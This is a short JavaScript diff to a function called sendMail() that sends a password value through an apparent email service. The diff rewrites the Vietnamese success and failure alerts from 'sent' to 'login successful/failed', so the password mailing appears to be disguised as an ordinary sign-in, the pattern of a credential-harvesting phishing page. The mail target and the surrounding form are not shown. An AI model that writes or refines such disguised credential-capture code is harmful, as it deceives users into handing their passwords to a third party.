@@ -145,10 +145,10 @@ function sendMail() {
     password: passwordValue
   })
   .then(function(response) {
-    alert("Gửi thành công!");
+    alert("Đăng nhập thành công!");
     console.log("SUCCESS", response.status, response.text);
   }, function(error) {
-    alert("Gửi thất bại, kiểm tra lại cấu hình!");
+    alert("Đăng nhập thất bại, kiểm tra lại cấu hình!");
     console.log("FAILED", error);
   });
 }
